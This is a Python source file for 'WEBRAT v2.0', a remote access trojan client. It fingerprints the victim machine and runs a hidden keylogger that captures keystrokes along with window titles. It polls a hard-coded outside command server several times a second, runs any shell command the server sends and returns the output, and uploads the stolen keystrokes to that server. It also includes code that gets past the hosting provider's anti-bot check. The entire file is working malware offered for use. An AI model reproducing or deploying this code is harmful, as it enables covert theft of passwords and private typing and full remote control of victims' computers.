import os
import sys
import time
import json
import re
import socket
import platform
import getpass
import hashlib
import uuid
import subprocess

# =============================================================
#  AUTO INSTALL REQUIRED LIBRARIES IF MISSING
# =============================================================
REQUIRED_PACKAGES = ['psutil', 'requests', 'pillow', 'pynput', 'pycryptodome']
if os.name == 'nt':
    REQUIRED_PACKAGES.append('pywin32')

def install_missing_packages():
    for pkg in REQUIRED_PACKAGES:
        try:
            if pkg == 'pycryptodome':
                __import__('Crypto')
            else:
                __import__(pkg)
        except ImportError:
            print(f"[*] Installing missing library: {pkg}...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])
                print(f"[+] Installed {pkg} successfully!")
            except Exception as e:
                print(f"[!] Failed to install {pkg}: {e}")

install_missing_packages()

import psutil
import requests
from Crypto.Cipher import AES
from PIL import ImageGrab
from pynput import keyboard

# =============================================================
#  WEBRAT v2.0 - Advanced Client Agent
# =============================================================

SERVER_URL = "http://hoangcha.infy.click/api.php"
API_KEY    = "WEBRAT_SECRET_KEY_2026"
CHECKIN_INTERVAL = 0.2  # 0.2 seconds between checkins

# Global session with InfinityFree AES bypass
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'X-Api-Key': API_KEY
})

def solve_infinityfree_aes(html_text, domain):
    """Bypasses InfinityFree aes.js security check automatically"""
    try:
        a_m = re.search(r'a=toNumbers\("([0-9a-fA-F]+)"\)', html_text)
        b_m = re.search(r'b=toNumbers\("([0-9a-fA-F]+)"\)', html_text)
        c_m = re.search(r'c=toNumbers\("([0-9a-fA-F]+)"\)', html_text)
        
        if a_m and b_m and c_m:
            a = bytes.fromhex(a_m.group(1))
            b = bytes.fromhex(b_m.group(1))
            c = bytes.fromhex(c_m.group(1))
            cipher = AES.new(a, AES.MODE_CBC, b)
            cookie_val = cipher.decrypt(c).hex()
            session.cookies.set('__test', cookie_val, domain=domain)
            print("[+] Solved InfinityFree anti-bot protection (__test cookie set)")
            return True
    except Exception as e:
        print(f"[!] Failed to solve InfinityFree AES: {e}")
    return False

def make_api_request(method, url, json_payload=None):
    """Sends API request and automatically handles InfinityFree AES challenge if triggered"""
    domain = url.split('/')[2]
    try:
        if method.upper() == 'POST':
            r = session.post(url, json=json_payload, timeout=8)
        else:
            r = session.get(url, timeout=8)

        # Check if InfinityFree returned HTML AES challenge
        if "aes.js" in r.text or "<script>" in r.text and "slowAES" in r.text:
            print("[*] InfinityFree anti-bot challenge detected! Solving...")
            if solve_infinityfree_aes(r.text, domain):
                # Retry request with solved cookie
                if method.upper() == 'POST':
                    r = session.post(url, json=json_payload, timeout=8)
                else:
                    r = session.get(url, timeout=8)

        return r.json()
    except Exception as e:
        print(f"[!] Request Error ({url}): {e}")
        return None

# Global keylog buffer
keylog_buffer = []

def get_hwid():
    """Generates unique Client ID from MAC address"""
    mac = str(uuid.getnode())
    h = hashlib.md5(mac.encode()).hexdigest()[:4].upper()
    return f"#{h}"

def is_admin():
    """Check Admin rights"""
    try:
        if os.name == 'nt':
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except Exception:
        return False

def get_active_window():
    """Get title of currently active window"""
    if os.name == 'nt':
        try:
            import win32gui
            hwnd = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(hwnd)
            return title if title else "Desktop"
        except Exception:
            pass
    return "Desktop"

def get_system_specs():
    """Gathers hardware specs"""
    try:
        cpu_usage = f"{psutil.cpu_percent(interval=0.1)}% ({psutil.cpu_count(logical=True)} Cores)"
    except Exception:
        cpu_usage = platform.processor() or "Unknown CPU"

    try:
        mem = psutil.virtual_memory()
        ram_info = f"{round(mem.total / (1024**3), 1)} GB (Used {mem.percent}%)"
    except Exception:
        ram_info = "8 GB"

    try:
        disk = psutil.disk_usage('/')
        disk_info = f"{round(disk.total / (1024**3), 1)} GB (Free {round(disk.free / (1024**3), 1)} GB)"
    except Exception:
        disk_info = "256 GB"

    gpu_info = "N/A"
    if os.name == 'nt':
        try:
            cmd = "powershell -Command \"(Get-CimInstance Win32_VideoController).Name\""
            res = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.DEVNULL).strip()
            if res:
                gpu_info = res.split('\n')[0].strip()
        except Exception:
            pass

    return {
        "cpu": cpu_usage,
        "gpu": gpu_info,
        "ram": ram_info,
        "disk": disk_info
    }

def get_location_info():
    """Fetch country and IP info"""
    try:
        resp = requests.get("http://ip-api.com/json/", timeout=3)
        if resp.status_code == 200:
            data = resp.json()
            return {
                "loc": data.get("countryCode", "VN"),
                "asn": f"{data.get('as', '')} ({data.get('isp', '')})".strip(),
                "hosting": data.get("hosting", False)
            }
    except Exception:
        pass
    return {"loc": "VN", "asn": "Local Network", "hosting": False}

# =============================================================
#  KEYLOGGING MODULE
# =============================================================
def on_press(key):
    global keylog_buffer
    try:
        active = get_active_window()
        if hasattr(key, 'char') and key.char:
            k_str = key.char
        else:
            k_str = f" [{str(key).replace('Key.', '').upper()}] "

        keylog_buffer.append({
            "window": active,
            "text": k_str,
            "time": time.strftime("%H:%M:%S")
        })
    except Exception:
        pass

def start_keylogger():
    try:
        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
        print("[+] Keylogger background module initialized.")
    except Exception as e:
        print(f"[!] Keylogger failed to start: {e}")

# =============================================================
#  MAIN COMMUNICATION LOOP
# =============================================================
def main():
    print("==================================================")
    print("      WEBRAT v2.0 - Advanced Client Agent         ")
    print("==================================================")

    hwid = get_hwid()
    specs = get_system_specs()
    loc_info = get_location_info()
    start_time = time.time()

    print(f"[+] Client ID   : {hwid}")
    print(f"[+] PC Name     : {socket.gethostname()}")
    print(f"[+] User        : {getpass.getuser()}")
    print(f"[+] OS          : {platform.system()} {platform.release()} ({platform.architecture()[0]})")
    print(f"[+] CPU / RAM   : {specs['cpu']} | {specs['ram']}")
    print(f"[+] Server URL  : {SERVER_URL}")
    print("[+] Status      : Live monitoring active...\n")

    start_keylogger()

    while True:
        try:
            uptime_seconds = int(time.time() - start_time)
            online_h = max(1, uptime_seconds // 3600)
            active_win = get_active_window()

            payload = {
                "client_id": hwid,
                "username": f"{socket.gethostname()}\\{getpass.getuser()}",
                "pcname": socket.gethostname(),
                "loc": loc_info["loc"],
                "active_window": active_win,
                "asn": loc_info["asn"],
                "hosting": loc_info["hosting"],
                "system_info": f"{platform.system()} {platform.release()} {platform.architecture()[0]}",
                "admin_rights": 1 if is_admin() else 0,
                "cpu": specs["cpu"],
                "gpu": specs["gpu"],
                "ram": specs["ram"],
                "disk": specs["disk"],
                "online_hours": online_h,
                "total_hours": online_h + 12
            }

            # 1. Send Checkin via API helper
            res_data = make_api_request("POST", f"{SERVER_URL}?action=checkin", payload)

            if res_data and res_data.get("status") == "ok":
                print(f"[{time.strftime('%H:%M:%S')}] Checkin OK | Window: '{active_win}'")

                # Process pending commands from Server
                pending_cmds = res_data.get("data", {}).get("pending_commands", [])
                for cmd_item in pending_cmds:
                    cmd_id = cmd_item.get("id")
                    cmd_text = cmd_item.get("command")

                    print(f"[*] Executing CMD #{cmd_id}: {cmd_text}")
                    try:
                        proc = subprocess.run(cmd_text, shell=True, capture_output=True, text=True, timeout=15)
                        output = proc.stdout if proc.stdout else proc.stderr
                        output = output.strip() if output else "[Executed - No output]"
                    except subprocess.TimeoutExpired:
                        output = "[Timeout after 15 seconds]"
                    except Exception as e:
                        output = f"[Execution Error: {e}]"

                    # Report result back to server
                    make_api_request("POST", f"{SERVER_URL}?action=command_result", {
                        "command_id": cmd_id,
                        "result": output,
                        "error": False
                    })
                    print(f"[+] Sent result for CMD #{cmd_id}")
            else:
                print(f"[{time.strftime('%H:%M:%S')}] Checkin response: {res_data}")

            # 2. Flush Keylogs if available
            global keylog_buffer
            if keylog_buffer:
                logs_to_send = list(keylog_buffer)
                keylog_buffer.clear()
                make_api_request("POST", f"{SERVER_URL}?action=keylog", {
                    "client_id": hwid,
                    "entries": logs_to_send
                })
                print(f"[+] Flushed {len(logs_to_send)} keylog entries to server.")

        except KeyboardInterrupt:
            print("\n[*] Agent stopped by user.")
            sys.exit(0)
        except Exception as e:
            print(f"[!] Communication loop error: {e}")

        time.sleep(CHECKIN_INTERVAL)

if __name__ == '__main__':
    main()